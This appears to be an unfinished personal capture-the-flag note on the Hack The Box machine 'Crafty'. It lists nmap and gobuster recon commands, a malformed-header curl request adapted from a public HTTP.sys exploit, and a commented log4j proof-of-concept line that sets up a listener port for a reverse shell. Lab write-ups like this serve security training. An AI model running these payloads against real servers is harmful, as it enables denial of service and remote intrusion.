## Crafty
```sh
nmap -p- -sV -sC --min-rate=100000 10.129.202.138
nmap -p- -sV -sC --min-rate=100000 10.129.202.138 --script vuln
echo "10.129.202.138 crafty.htb" | sudo tee -a /etc/hosts
echo "10.129.202.138 play.crafty.htb" | sudo tee -a /etc/hosts
# found an exploit for that windows server so i tried if its possible to use 
#i asked github copilot to make a curl from thath code: https://www.exploit-db.com/exploits/51575

curl -H "Accept-Encoding: AAAAAAAAAAAAAAAAAAAAAAAA, BBBBBBcccACCCACACATTATTATAASDFADFAFSDDAHJSKSKKSKKSKJHHSHHHAY&AU&**SISODDJJDJJDJJJDJJSU**S, RRARRARYYYATTATTTTATTATTATSHHSGGUGFURYTIUHSLKJLKJMNLSJLJLJSLJJLJLKJHJVHGF, TTYCTCTTTCGFDSGAHDTUYGKJHJLKJHGFUTYREYUTIYOUPIOOLPLMKNLIJOPKOLPKOPJLKOP, OOOAOAOOOAOOAOOOAOOOAOOOAOO, ****************************stupiD, *, ,'," http://crafty.htb/
sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://crafty.htb/
git clone https://github.com/michelep/CVE-2022-21907-Vulnerability-PoC.git
sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://play.crafty.htb/
sudo gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://crafty.htb/
sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://crafty.htb/ -x asp,php,html,txt,json -r
# nothing found yet
nmap -p- 10.129.202.138 #delivers more thanthe other nmap command
#80/tcp    open  http
#25565/tcp open  minecraft
#A minecraft server is running on the machine, didnt expect that
# ok its copilot time how to connect to a minecraft server wit python
```

### Cancel here
There are a lot of repos to use that log4j exploit in that minecraft server
but i couldnt install minecraft on the htb machine
i used an nodejs client whih worked partly
but i notices the target machine keeps crashing when i misstyped
additionally it was very dependend on certain ways to connect
```sh
#python3 poc.py --userip <tun0 IP> --webport 80 --lport 4444

#I had to follow an online guide and just get the user flag, What i dont yet understand is why my normal ldap exploit didnt worked
#just a specific github code worked with very specific jdk
# and shortly after my HTB Attacker machine crashed
# so i would have to install all again and prefer to make a break. with this machine 
```
